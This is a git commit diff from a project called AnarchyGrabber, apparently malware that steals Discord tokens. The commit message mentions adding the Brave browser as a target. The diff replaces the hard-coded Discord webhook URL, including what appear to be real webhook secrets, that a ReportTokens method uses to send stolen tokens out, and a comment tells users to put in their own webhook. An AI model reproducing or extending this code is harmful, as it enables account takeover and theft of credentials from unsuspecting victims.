b255c69e453a975b0e2e3ccd4665a2c848924079
iLinked1337 <ilinkedthememe@gmail.com>
2019-08-17 12:43:59 +0200

    added Brave to services

--- AnarchyGrabber/Webhook.cs
+++ AnarchyGrabber/Webhook.cs
@@ -7,7 +7,7 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static string _hookUrl = "https://discordapp.com/api/webhooks/610873960929951785/efpavQf4AYrB4SSrKZxXEjDYAzdPDRc7wbMPucV2cyTXAfs39ohhpyNFJiNF8Rp6dqg8";
+        private static string _hookUrl = "https://discordapp.com/api/webhooks/612234114271150083/aHR2Owsu90Ugkq6l7Tw7HcyhPJcPCzeHhsEBc3SuVGKcGqTMxGBJZAFQSL57TPPiqZA0";
 
 
         public static void ReportTokens(List<string> tokenReport)
